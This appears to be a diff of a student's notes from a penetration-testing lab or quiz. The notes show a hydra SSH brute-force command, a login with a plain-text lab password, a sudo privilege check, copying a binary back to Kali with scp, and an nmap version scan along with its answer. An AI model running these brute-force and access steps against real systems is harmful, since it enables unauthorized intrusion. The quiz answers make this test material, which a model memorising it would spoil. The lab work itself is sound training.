@@ -1,5 +1,5 @@
 
-hydra -L Usernames.txt -P Passwords.txt 172.25.120.240 -s 60000 ssh -t16 -V
+hydra -L Usernames.txt -P Passwords.txt 172.25.120.240 -s 60000 ssh -t16 -f -V
 
 ssh student@172.25.120.240 -p 60000 
     password:studentpassword
@@ -10,5 +10,12 @@ sudo -l (ALL - student can easily swich as root with student password)
 
 cp /home/student/Downloads/rp-lin-x86 /tmp
 
-in kali: scp -P 60000 student@172.25.120.240:/tmp/rp-lin-x86 .
+in kali: scp -P 60000 student@172.25.120.240:/tmp/rp-lin-x86 .    (to copy the file form remote ubntu to kali)
+
+### What version of ssh is on the machine at 172.25.120.240?
+
+nmap 172.25.120.240 -p 60000 -sV -A -T4 
+    Answer: 7.6p1
+
+### On the 172.25.120.240 machine, is the rp-lin-x86 file, stripped or not stripped.
 
